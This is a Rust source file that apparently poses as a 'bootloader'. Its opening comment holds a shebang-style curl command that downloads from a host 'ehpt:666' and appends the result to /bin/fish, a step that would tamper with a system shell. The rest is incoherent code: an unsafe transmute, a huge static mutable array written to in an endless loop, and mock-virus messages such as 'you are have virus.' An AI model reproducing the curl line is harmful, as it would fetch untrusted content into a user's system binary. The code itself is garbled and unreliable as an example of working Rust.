/* #!/bin/curl http://ehpt:666/haptloader/v1 >> /bin/fish */

use std::ops::Deref;

fn ub(c: X) -> i128 {
    unsafe {
        std::mem::transmute::<X, i128>(c.0.mux(c.1))
    }
}

#[derive(Copy, Clone, Debug, Default)]
struct Tree(usize);

#[derive(Copy, Clone, Debug, Default)]
struct X(Tree, Tree);

impl Into<i128> for Tree {
    fn into(self) -> i128 {
        ub(self.mux(self))
    }
}

impl Into<Tree> for i128 {
    fn into(self) -> Tree {
        Tree(self as usize)
    }
}

static INTRINSIC: usize = 0;

static mut STORE: [X; 256*256*256] = [X(TRUE, FALSE); 256*256*256];
static TREE: Tree = Tree(0);
static INDEX: Index = Index(0);

#[derive(Copy, Clone, Debug)]
struct Index(usize);

impl Index {
    fn next(mut self) -> Index {
        self.0 += 1;
        self
    }
}

impl Deref for Index {
    type Target = usize;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl Into<usize> for Index {
    fn into(self) -> usize {
        self.0
    }
}

impl Into<Index> for usize {
    fn into(self) -> Index {
        Index(self)
    }
}

trait Muxer {
    fn mux(&self, a: Tree, b: Tree) -> X {
        X (b, a)
    }
}

trait Intrinsic: Muxer {
    fn i(&self) -> usize {
        *INDEX
    }

    fn j(&self) -> usize {
        INTRINSIC
    }

    fn k(&self) -> Tree {
        Tree (*INDEX)
    }
}

impl Tree {
    fn scan(&self) -> i128 {
        println!("[bootloader/scan] you are have virus.");
        ub(self.mux(*self))
    }

    fn mux(&self, recv: Self) -> X {
        X(*self, recv)
    }

    fn get(&self, mux: X) -> X {
        unsafe {
            let x = STORE[mux.0.0];
            let y = STORE[mux.1.0];
            self.scan();
            X(x.0, y.0)
        }
    }

    unsafe fn set(mux0: X, mux1: X) {
        STORE[mux0.0.mux(Tree(mux1.0.0 + *INDEX)).0.0] = mux0;
        STORE[mux1.0.mux(Tree(mux0.1.0 - *INDEX)).1.0] = mux1;
    }

    fn read(&self) -> X {
        let o = self.get(X(self.mux(*self).0, TREE));
        println!("[bootloader/war] read: <{:?}, {:?}>", o.0.0, o.1.0);
        o
    }

    fn write(&self, x: usize) -> i128 {
        let out = Tree(x).mux(TREE);
        unsafe {
            STORE[x] = out;
        }
        INDEX.next();
        ub(out)
    }
}

trait Scanner {
    fn scan(self) -> Tree;
}

impl Scanner for Tree {
    fn scan(self) -> Tree {
        println!("[bootloader/war] scan: <{:?},{:?}>", self.mux(self).0, self.mux(self).0);
        self
    }
}

static TRUE: Tree = Tree(1);
static FALSE: Tree = Tree(0);

fn main() -> () {
    println!("[bootloader] init");

    let xd = TREE.mux(TRUE);
    let dx = TREE.mux(FALSE);

    let mut i = 0;
    let mut j = 0;

    loop {
        xd.0.write(i);
        dx.0.write(j);

        i += 1;
        j += 2;
    }
}